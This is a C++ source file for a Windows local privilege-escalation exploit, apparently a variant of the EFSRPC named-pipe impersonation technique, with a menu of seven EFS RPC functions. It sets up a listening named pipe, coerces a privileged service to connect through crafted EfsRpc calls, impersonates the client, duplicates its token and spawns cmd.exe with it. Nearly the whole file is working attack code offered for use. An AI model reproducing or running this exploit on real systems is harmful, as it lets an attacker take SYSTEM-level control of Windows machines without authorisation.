
#pragma comment(lib, "RpcRT4.lib")
#include "efsr_h.h"
#include <iostream>
#include <tchar.h>	
#include <strsafe.h>
#include <sddl.h>
#include <thread>
#include <string>


void GetSystemAsImpersonatedUser(HANDLE hToken)
{
	DWORD dwCreationFlags = 0;
	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
	BOOL g_bInteractWithConsole = TRUE;
	LPWSTR pwszCurrentDirectory = NULL;
	dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;
	LPVOID lpEnvironment = NULL;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };

	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
	{
		wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
		CloseHandle(hToken);
		return;
	}
	wprintf(L"[+]DuplicateTokenEx() OK\n");
	if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, L"cmd.exe", dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
	{
		wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
		CloseHandle(hSystemTokenDup);
		return;
	}
	else
	{
		wprintf(L"[+] CreateProcessWithTokenW() OK\n");
		return;
	}
}

void StartNamedPipeAndGetSystem()
{
	printf("start StartNamedPipeAndGetSystem\n");
	HANDLE hPipe = INVALID_HANDLE_VALUE;
	LPWSTR pwszPipeName;
	SECURITY_DESCRIPTOR sd = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };
	DWORD buffer_size = 0;
	HANDLE hToken = INVALID_HANDLE_VALUE;

	pwszPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
	StringCchPrintf(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\crispr\\pipe\\srvsvc");

	

	if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
	{
		wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
		LocalFree(pwszPipeName);
		return;
	}
	if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
		LocalFree(pwszPipeName);
		return;
	}
	if ((hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
	{
		wprintf(L"[*] Named pipe '%ls' listening...\n", pwszPipeName);
		ConnectNamedPipe(hPipe, NULL);
		wprintf(L"[+] A client connected!\n");
		if (ImpersonateNamedPipeClient(hPipe)) {
			if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
				CloseHandle(hPipe);
				GetSystemAsImpersonatedUser(hToken);
			}
		}
		else {
			printf("CreateNamedPipe error\n");
			CloseHandle(hPipe);
		}
		return ;
	}
}

void ConnectEvilPipe(int choice) 
{
	RPC_STATUS status;
	RPC_WSTR pszStringBinding;
	RPC_BINDING_HANDLE BindingHandle;

	status = RpcStringBindingCompose(
		NULL,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)L"\\\\127.0.0.1",//这里取NULL也能代表本地连接
		(RPC_WSTR)L"\\pipe\\lsass",
		NULL,
		&pszStringBinding
	);
	wprintf(L"[+]RpcStringBindingCompose status: %d\n", status);
	wprintf(L"[*] String binding: %ws\r\n", pszStringBinding);
	//绑定接口
	status = RpcBindingFromStringBinding(pszStringBinding, &BindingHandle);
	wprintf(L"[+]RpcBindingFromStringBinding status: %d\n", status);

	//释放资源
	status = RpcStringFree(&pszStringBinding);
	wprintf(L"RpcStringFree code:%d\n", status);

	RpcTryExcept{
		PVOID pContent;
		LPWSTR pwszFileName;
		pwszFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
		//\\\\127.0.0.1\\C$\\tmp\\test.txt
		StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1/pipe/crispr\\C$\\x");
		
		//StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1\\C$\\Users\\test.txt");
		
		long result;
		wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFileName);
		switch (choice)
		{
		case 1:
			result = Proc0_EfsRpcOpenFileRaw_Downlevel(
				BindingHandle,
				&pContent,
				pwszFileName,
				0
			);
			wprintf(L"[*] EfsRpcOpenFileRaw_Downlevel status code: %d\r\n", result);
			break;
		case 2:
			result = Proc4_EfsRpcEncryptFileSrv_Downlevel(BindingHandle, pwszFileName);
			wprintf(L"[*] EfsRpcEncryptFileSrv_Downlevel status code: %d\r\n", result);
			break;
		case 3:
			result = Proc5_EfsRpcDecryptFileSrv_Downlevel(BindingHandle, pwszFileName,0);
			wprintf(L"[*] EfsRpcDecryptFileSrv_Downlevel status code: %d\r\n", result);
			break;
		case 4:
			Struct_220_t * blub_1;
			result = Proc6_EfsRpcQueryUsersOnFile_Downlevel(BindingHandle, pwszFileName, &blub_1);
			wprintf(L"[*] EfsRpcQueryUsersOnFile_Downlevel status code: %d\r\n", result);
			break;
		case 5:
			Struct_220_t * blub_2;
			result = Proc7_EfsRpcQueryRecoveryAgents_Downlevel(BindingHandle, pwszFileName, &blub_2);
			wprintf(L"[*] EfsRpcQueryRecoveryAgents_Downlevel status code: %d\r\n", result);
			break;
		case 6:
			Struct_220_t  blub_3;
			result = Proc8_EfsRpcRemoveUsersFromFile_Downlevel(BindingHandle, pwszFileName, &blub_3);
			wprintf(L"[*] EfsRpcRemoveUsersFromFile_Downlevel status code: %d\r\n", result);
			break;
		case 7:
			Struct_346_t blub_4;
			result = Proc9_EfsRpcAddUsersToFile_Downlevel(BindingHandle, pwszFileName, &blub_4);
			wprintf(L"[*] EfsRpcAddUsersToFile_Downlevel status code: %d\r\n", result);
			break;
		default:
			break;
		}
			
		
		

		
		status = RpcBindingFree(
			&BindingHandle                   // Reference to the opened binding handle
		);
		LocalFree(pwszFileName);
	}
		RpcExcept(1)
	{
		wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
	}RpcEndExcept

		

}

int main(int argc, char * argv[])
{
	if (argc != 2)
	{
		printf("Author:Crispr\n");
		printf("[+]Usage:%s <EFS-API-to-use>\n\n",argv[0]);
		wprintf(L"1: EfsRpcOpenFileRaw (fixed with CVE-2021-36942)\n");
		wprintf(L"2: EfsRpcEncryptFileSrv_Downlevel\n");
		wprintf(L"3: EfsRpcDecryptFileSrv_Downlevel\n");
		wprintf(L"4: EfsRpcQueryUsersOnFile_Downlevel\n");
		wprintf(L"5: EfsRpcQueryRecoveryAgents_Downlevel\n");
		wprintf(L"6: EfsRpcRemoveUsersFromFile_Downlevel\n");
		wprintf(L"7: EfsRpcAddUsersToFile_Downlevel\n");
		return 0;
	}
	int choice = atoi(argv[1]);
	std::thread t{ StartNamedPipeAndGetSystem };
	t.detach();
	Sleep(1000);
	ConnectEvilPipe(choice);
	Sleep(1500);
	return 0;
}


/*
int wmain(int argc, wchar_t* agrv[])
{
	RPC_STATUS status;
	RPC_WSTR pszStringBinding;
	RPC_BINDING_HANDLE BindingHandle;

	status = RpcStringBindingCompose(
		NULL,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)L"\\\\127.0.0.1",//这里取NULL也能代表本地连接
		(RPC_WSTR)L"\\pipe\\lsarpc",
		NULL,
		&pszStringBinding
	);
	wprintf(L"[+]RpcStringBindingCompose status: %d\n", status);
	wprintf(L"[*] String binding: %ws\r\n", pszStringBinding);
	//绑定接口
	status = RpcBindingFromStringBinding(pszStringBinding, &BindingHandle);
	wprintf(L"[+]RpcBindingFromStringBinding status: %d\n",status);

	//释放资源
	status = RpcStringFree(&pszStringBinding);
	wprintf(L"RpcStringFree code:%d\n", status);

	RpcTryExcept{
		PVOID pContent;
		LPWSTR pwszFileName;
		pwszFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
		//\\\\127.0.0.1\\C$\\tmp\\test.txt
		StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1/pipe/crispr\\D$\\x");
		long result;
		wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFileName);
		result = Proc0_EfsRpcOpenFileRaw_Downlevel(
			BindingHandle,
			&pContent,
			pwszFileName,
			0
		);
		wprintf(L"[*] EfsRpcOpenFileRaw status code: %d\r\n", result);
		status = RpcBindingFree(
			&BindingHandle                   // Reference to the opened binding handle
		);
	}
	RpcExcept(1)
	{
		wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
	}RpcEndExcept


}
*/

// 下面的函数是为了满足链接需要而写的，没有的话会出现链接错误
void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}
void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}